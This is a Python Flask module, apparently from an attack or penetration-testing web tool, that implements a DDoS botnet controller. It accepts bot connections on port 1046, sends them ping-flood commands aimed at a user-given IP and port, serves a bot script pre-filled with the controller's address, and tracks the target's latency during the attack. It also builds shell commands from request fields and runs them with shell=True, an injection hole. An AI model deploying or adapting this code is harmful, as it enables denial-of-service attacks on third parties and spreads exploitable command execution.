from flask import Blueprint, request
from utilities.databaseFunc import *
import subprocess
import time
import socket
import threading
from app import db
import sys
import select
import datetime

ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
cancel_event = threading.Event() #  Global cancel event
latencyPingList = []
threads = []
accepted_addresses = set()  # Set to store accepted addresses
cancelled = False

@ddosAttack.post("/")
def DDOSAttack():
    global cancelled, threads, latencyPingList, accepted_addresses, cancel_event

    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = data["duration"]

    command = getCommand("DDOS", "PINGFLOOD")
    command = command.format(
        attackType = attackType,
        packetSize = packetSize,
        portNumber = portNumber,
        ipAddress = ipAddress,
        duration = duration)

    # create thread for latency polling
    latencyCheck = threading.Thread(target=checkLatencyPeriodically, args=(ipAddress, duration))
    latencyCheck.start()

    # launch dos on bots using a seperate thread
    bots = threading.Thread(target=botnet, args=(command, duration))
    bots.start()
    bots.join()

    if not cancel_event.is_set():
        # collect results
        latency_ping_list_result = list(latencyPingList)  # Copy the list to avoid shared memory issues

        # log dos attack details to database
        logActivityDOS("DDOS ATTACK", data, latency_ping_list_result)

    latencyPingList.clear()
    threads.clear()
    accepted_addresses.clear()
    cancel_event.clear()
    cancelled = False

    return ""

def checkLatencyPeriodically(ip_address, duration):
    global latencyPingList
    command = getCommand("PING", "LATENCY")
    command = command.format(ipAddress=ip_address)
    start_time = datetime.datetime.now()
    duration = datetime.timedelta(seconds=int(duration))

    # poll for latency every 5 seconds
    while datetime.datetime.now() - start_time < duration:
        if cancel_event.is_set():
            return  # Exit early if the cancel event is set
        latency(command)
        time.sleep(5)

@ddosAttack.post("/latency")
def checkLatency():
    global latencyPingList
    if len(latencyPingList) > 0:
        return latencyPingList[-1]
    else:
        return ""

def latency(command):
    global latencyPingList
    ping_process = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
    output, _ = ping_process.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    # append latency ping result to list
    if "time" in line:
        result = '[PING SUCCESS] ' + line
    else:
        result = '[PING FAILED] ' + line
    
    latencyPingList.append(result)
    return result

@ddosAttack.get("/botnet")
def getBotnetScript():
    command = getCommand("DDOS", "BOTNET")
    script = command.replace('target_host = ""', f'target_host = "{getIpAddress()}"')
    return script
    
def send_commands(conn, command):
    if len(str.encode(command)) > 0:
        conn.send(str.encode(command))
        client_response = str(conn.recv(1024), "utf-8")
        print(client_response, end="")

def botnet(command, duration):
    global threads, accepted_addresses, cancelled
    bindIp = getIpAddress()
    bindPort = 1046
    servAdd = (bindIp, bindPort)
    duration = int(duration)
    
    # create socket to listen
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((servAdd))
    server.listen(5)

    server.setblocking(0)  # Set the server socket to non-blocking

    start_time = time.time()

    while (time.time() - start_time) < duration and not cancelled:  # assuming should_stop is your exit condition
        ready_to_read, _, _ = select.select([server], [], [], 1.0)

        if ready_to_read:
            try:
                conn, addr = server.accept()
                ip_address = addr[0]  # Extracting only the IP part from the address tuple
                if ip_address not in accepted_addresses:
                    accepted_addresses.add(ip_address)
                    client_thread = threading.Thread(target=handleClient, args=(conn, addr, command))
                    client_thread.start()
                    threads.append(client_thread)

            except socket.error as e:
                # Handle socket error if needed
                pass

    # Optionally, wait for all threads to finish
    for thread in threads:
        thread.join()

    server.close()

def handleClient(conn, addr, command):
    # Handle the connection
    print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
    sys.stdout.flush()  # Add this line
    send_commands(conn, command)
    conn.close()

def getIpAddress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

@ddosAttack.get("/cancel")
def cancelScan():
    global threads, cancelled, accepted_addresses
    cancelled = True
    cancel_event.set()  # Set the cancel event

    # send a command to each bot here
    cancel_command = "cancel_ddos" 
    for bot_thread in threads:
        # Extract connection and address from the thread's arguments
        bot_conn, bot_addr, _ = bot_thread._args  # Accessing the args attribute
        
        print(bot_conn, cancel_command)

        # Send the cancel command to the bot
        send_commands(bot_conn, cancel_command)

    return "activity cancelled"